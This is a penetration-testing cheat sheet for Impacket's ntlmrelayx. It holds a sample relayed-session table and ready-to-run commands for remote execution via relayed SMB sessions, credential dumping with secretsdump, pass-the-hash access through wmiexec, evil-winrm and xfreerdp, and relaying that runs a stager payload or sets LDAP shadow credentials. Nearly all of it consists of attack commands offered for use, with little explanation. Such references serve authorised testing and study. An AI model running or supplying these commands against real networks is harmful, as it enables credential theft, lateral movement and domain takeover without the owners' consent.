# Impacket NtlmRelayX

## Utilizing Sock sessions with Responder and NtlmRelayX

```console
ntlmrelayx> socks
Protocol  Target          Username                  Port
--------  --------------  ------------------------  ----
SMB       172.21.48.38   SPAWN/MSIMMONS            445
MSSQL     172.21.48.230  FAERIE/ADMINISTRATOR      1433
MSSQL     172.21.48.230  FAERIE/ROOT               1433
SMB       172.21.48.230  FAERIE/ADMINISTRATOR      445
SMB       172.21.48.230  FAERIE/ALSIMMONS          445
SMTP      172.21.48.225  FAERIEEXCHANGE/SBURKE     25
SMTP      172.21.48.225  FAERIEEXCHANGE/TWILLIAMS  25
IMAP      172.21.48.225  FAERIEEXCHANGE/TMCFARLANE 143
```

## Testing Sock Access from NtlmRelayX: 
### SMB:
Using SMBExec:
- `proxychains4  impacket-smbexec SPAWN/MSIMMONS@172.21.48.38`
- `proxychains4  smbexec.py SPAWN/MSIMMONS@172.21.48.38`
Using Smbclient
- `proxychains4 impacket-smbclient SPAWN/MSIMMONS@172.21.48.38`
- `proxychains4 smbclient.py SPAWN/MSIMMONS@172.21.48.38`

### Secrets Dump
- `proxychains4  impacket-secretsdump SPAWN/MSIMMONS@172.21.48.38`
- `proxychains4  secretsdump.py SPAWN/MSIMMONS@172.21.48.38`

### Pass The Hash:
If you obtain hashes from ntlmrelayx you can use the ntlm hash to gain access to a target using the following scripts or tools: 

Impacket Wmiexec:
- `impacket-wmiexec -hashes ' INSERT HASH HERE' administrator@172.21.48.230`
- `wmiexec.py -hashes ' INSERT HASH HERE' administrator@172.21.48.230`

Evil-WinRM:
- `evil-winrm -u Administrator -H 'INSERT HASH HERE' -i 172.21.48.230`

XfreeRDP: 
- `xfreerdp /u:Administrator /pth:'INSERT HASH HERE' /v:172.21.48.230`

## Other NtlmRelayX Commands: 
### In Kali:
#### SMB
- `impacket-ntlmrelayx -socks -smb2support -tf smb-targets.txt -c <Stager/Stageless Payload>`
- `impacket-ntlmrelayx -socks -smb2support -tf smb-targets.txt -c whoami`

#### Ldap
- `impacket-ntlmrelayx -t ldap://dc.domain.local --shadow-credentials --shadow-target target\$`

### Python Impacket: 
#### SMB
- `ntlmrelayx.py -socks -smb2support -tf smb-targets.txt -c <Stager/Stageless Payload>`
- `ntlmrelayx.py -tf smb-targets.txt -c whoami`

#### LDAP
- `ntlmrelayx.py -t ldap://dc.domain.local --shadow-credentials --shadow-target target\$`

## References: 
- https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/
- https://infosecwriteups.com/abusing-ntlm-relay-and-pass-the-hash-for-admin-d24d0f12bea0
- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
- https://www.offsec-journey.com/post/attacking-ms-sql-servers